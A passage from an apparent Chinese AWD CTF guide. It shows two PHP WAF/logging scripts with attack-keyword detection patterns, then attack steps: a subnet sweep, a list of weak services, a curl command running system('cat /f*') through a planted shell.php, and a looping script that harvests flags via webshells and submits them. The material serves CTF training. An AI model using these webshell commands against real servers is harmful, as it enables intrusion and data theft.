class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取post的data，无论是否是mutipa</span><br>rt <span class="hljs-variable">$headers</span> = <span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//获取header</span><br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$url</span>)))); <span class="hljs-comment">//</span><br>对URL进行检测，出现问题则拦截并记录<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$data</span>))));<br><span class="hljs-comment">//对POST的内容进行检测，出现问题拦截并记录</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测过了则对输入进行简单过滤</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//对http请求头进行检测，出现问题拦截并记录</span><br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//简单过滤</span><br>    <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http请求头并写入数组</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;<br>            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ascii</span> &gt; <span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>) &#123; <span class="hljs-comment">//有中文这里要修改</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<br>                <span class="hljs-number">9</span>,<br>                <span class="hljs-number">10</span>,<br>                <span class="hljs-number">13</span><br>            ))) &#123;<br>                <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;`&quot;</span>,<br>        <span class="hljs-string">&quot;|&quot;</span>,<br>        <span class="hljs-string">&quot;;&quot;</span>,<br>        <span class="hljs-string">&quot;,&quot;</span><br>    ) , <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b</span><br><span class="hljs-string">|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|m</span><br><span class="hljs-string">ultipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">简单将易出现问题的字符替换成中文</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http的请求包，意义在于获取别人的攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raw</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>] . <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;<br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>);<br>            <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$key</span> . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;\r\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$raw</span>.= <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    <span class="hljs-variable">$raw</span>.= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这里拦截并记录攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>) . <span class="hljs-string">&quot; --</span><br><span class="hljs-string">[&quot;</span> . <span class="hljs-variable">$alert</span> . <span class="hljs-string">&quot;]&quot;</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">get_http_raw</span>() . <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;log_is_a_secret_file.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径</span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:http://172.16.9.2/&quot;</span>);  <span class="hljs-comment"># </span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">15</span>); <span class="hljs-comment">//拦截前延时15秒</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>郁离歌的一枚 WAF，会在 <code>/tmp/loooooooogs</code> 目录下生成日志文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="hljs-string">&#x27;/tmp/loooooooogs&#x27;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(LOG_FILEDIR))&#123;<br>	<span class="hljs-title function_ invoke__">mkdir</span>(LOG_FILEDIR);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123; <br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <br><span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>)))))] = <span class="hljs-variable">$value</span>;<br>&#125; <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>; <br>&#125; <br>&#125; <br><span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>; <br><span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>; <br><span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>; <br><span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>(); <br><span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>; <br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]; <br><span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]; <br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>]; <br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br><span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]); <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>); <br>&#125;<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]);<br><span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Get&quot;</span>=&gt;<span class="hljs-variable">$get</span>, <span class="hljs-string">&quot;Post&quot;</span>=&gt;<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;Cookie&quot;</span>=&gt;<span class="hljs-variable">$cookie</span>, <span class="hljs-string">&quot;File&quot;</span>=&gt;<span class="hljs-variable">$files</span>, <span class="hljs-string">&quot;Header&quot;</span>=&gt;<span class="hljs-variable">$header</span>);<br><br><span class="hljs-title function_ invoke__">logging</span>(<span class="hljs-variable">$input</span>);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logging</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><span class="hljs-variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d G:i:s&quot;</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$LOG_FILENAME</span>, <span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>, <span class="hljs-literal">true</span>), FILE_APPEND); <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$LOG_FILENAME</span>,<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$LOG_FILENAME</span>,<span class="hljs-string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);<br>&#125;<br><br><span class="hljs-title function_ invoke__">waf</span>(); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><ul>
+<li>nmap、arp-scan</li>
+<li>python脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">255</span>): <br>    url = <span class="hljs-string">&quot;http://192.168.1.&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x) <br>    <span class="hljs-keyword">try</span>: <br>        r = requests.post(url) <br>        <span class="hljs-built_in">print</span>(url) <br>    <span class="hljs-keyword">except</span>: <br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
+<li>nmap、masscan</li>
+</ul>
+<p>以下是一些服务端口的漏洞：</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>漏洞</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>ssh弱口令</td>
+</tr>
+<tr>
+<td>873</td>
+<td>未授权访问漏洞</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql弱口令</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>redis未授权访问漏洞</td>
+</tr>
+</tbody></table>
+<h3 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h3><h4 id="curl读flag"><a href="#curl读flag" class="headerlink" title="curl读flag"></a>curl读flag</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://192.168.182.130:8801/include/shell.php&quot;</span> -d <span class="hljs-string">&quot;admin_ccmd=system(&#x27;cat /f*&#x27;);&quot;</span><br><span class="hljs-comment"># -d 代表post请求体数据</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="后门批量交flag脚本"><a href="#后门批量交flag脚本" class="headerlink" title="后门批量交flag脚本"></a>后门批量交flag脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>data = &#123;<br>    <span class="hljs-string">&#x27;123&#x27;</span>:<span class="hljs-string">&quot;system(&#x27;cat+/home/ctf/flag&#x27;);&quot;</span>      <span class="hljs-comment"># 一句话木马</span><br>&#125;<br><br><span class="hljs-built_in">list</span> = []<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        <span class="hljs-keyword">try</span>:<br>            io = requests.get(<span class="hljs-string">&quot;http://192-168-1-&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;.awd.bugku.cn/e/search/result/1.php?s=print_r(readfile(%27../../../../home/ctf/flag%27))&quot;</span>) <span class="hljs-comment"># get</span><br>            <span class="hljs-comment"># list.append(io.text[0:38])</span><br>            <span class="hljs-built_in">list</span>.append(re.search(<span class="hljs-string">&quot;flag&#123;.*&#125;&quot;</span>, io.text).group(<span class="hljs-number">0</span>)[:<span class="hljs-number">38</span>])<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell1</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        <span class="hljs-keyword">try</span>:<br>            io = requests.post(<span class="hljs-string">&quot;http://192-168-1-&quot;</span> + <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&quot;.awd.bugku.cn/view/index/images/logo.php&quot;</span>,data=data)  <span class="hljs-comment"># post</span><br>            <span class="hljs-comment"># list.append(io.text[0:38])</span><br>            <span class="hljs-built_in">list</span>.append(re.search(<span class="hljs-string">&quot;flag&#123;.*&#125;&quot;</span>, io.text).group(<span class="hljs-number">0</span>)[:<span class="hljs-number">38</span>])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    shell()<br>    <span class="hljs-comment"># shell1()</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        io = requests.get(<span class="hljs-string">&quot;https://ctf.bugku.com/awd/submit.html?token=c2c1e4d002daa9eea931888935b0dd86&amp;flag=&quot;</span> + <span class="hljs-built_in">str</span>(i))<br>        <span class="hljs-comment"># token 根据场景更改</span><br>        <br></code></pre></td></tr></table></figure>
+
+
+
+<p>写flag脚本</p>
